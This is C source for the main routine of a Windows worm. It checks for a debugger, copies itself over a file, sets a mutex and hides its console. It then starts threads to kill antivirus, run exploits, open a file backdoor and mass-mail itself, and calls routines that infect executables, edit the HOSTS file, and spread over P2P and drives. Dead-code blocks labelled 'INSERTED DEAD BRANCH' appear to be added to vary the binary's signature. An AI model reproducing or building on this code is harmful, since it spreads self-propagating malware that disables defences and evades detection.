#include "data_globals.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>   // for strcmp
#include <stdlib.h>   // for malloc/free

#pragma optimize("", off)
int main(int argc, char **argv, char **env)
{
    BOOL is_debugger_present;
    int result;
    DWORD last_error;
    HWND hWnd;
    CHAR local_110[256];

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char user_buf[128];
        DWORD user_len = sizeof(user_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetUserNameA(user_buf, &user_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= user_buf[0];
            // read existing locals (no modification)
            volatile size_t arg_len = (argc > 0 && argv[0]) ? strlen(argv[0]) : 0;
            volatile size_t path_len = local_110 ? strlen(local_110) : 0;
            hash += (DWORD)(arg_len + path_len);
            volatile DWORD j = 0;
            while (j < 2) {
                hash = (hash << 5) - hash + si.dwPageSize;
                j++;
            }
            memset(user_buf, 0, sizeof(user_buf));
        }
    }

    is_debugger_present = IsDebuggerPresent();
    if (is_debugger_present == 0) {
        if (argc == 2) {
            GetModuleFileNameA(NULL, local_110, sizeof(local_110));
            if (strcmp(argv[1], local_110) != 0) {
                SetFileAttributesA(argv[1], FILE_ATTRIBUTE_NORMAL);
                CopyFileA(local_110, argv[1], FALSE);
            }
        }
        CreateMutexA(NULL, FALSE, "Wer45bbrtb439");
        last_error = GetLastError();

        // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
        volatile DWORD dummy_tick_2 = GetTickCount();
        if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
            char *tmp = (char *)malloc(64);
            if (tmp != NULL) {
                strcpy(tmp, "dummy");
                volatile DWORD len = strlen(tmp);
                volatile BYTE check = 0;
                for (volatile DWORD i = 0; i < len; i++) {
                    check ^= tmp[i];
                }
                volatile DWORD j = 0;
                while (j < 2) {
                    // read existing locals (no modification)
                    check += j + (DWORD)last_error;
                    j++;
                }
                char tmp2[32];
                memcpy(tmp2, tmp, 4);
                volatile DWORD val = (DWORD)tmp2[0] + check;
                val += len;
                free(tmp);
            }
        }

        if (last_error == ERROR_ALREADY_EXISTS) {
            result = 1;
        } else {
            AllocConsole();
            hWnd = FindWindowA("ConsoleWindowClass", NULL);
            ShowWindow(hWnd, SW_HIDE);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_AntiVirusTerminate, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ExploitMain, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_FileBackdoor, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_MassMailMain, NULL, 0, NULL);
            _Install();
            _HOSTSFile();
            _InfectExes();
            p2p_spread();
            InfectDrives();   // fixed: removed underscore
            result = 0;
        }
    } else {
        result = 1;
    }

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        volatile DWORD dummy_array[4];
        for (volatile DWORD i = 0; i < 4; i++) {
            dummy_array[i] = i * 0x811C9DC5;
        }
        volatile DWORD hash = 0;
        for (volatile DWORD i = 0; i < 4; i++) {
            hash ^= dummy_array[i];
            hash = (hash << 5) - hash;
        }
        volatile DWORD extra_val = 0;
        for (volatile DWORD i = 0; i < 2; i++) {
            extra_val += (hash >> i) & 0xFF;
        }
        extra_val ^= dummy_array[3];
        // read existing locals (no modification)
        extra_val += (DWORD)result;
        memset(dummy_array, 0, sizeof(dummy_array));
    }

    return result;
}
#pragma optimize("", on)
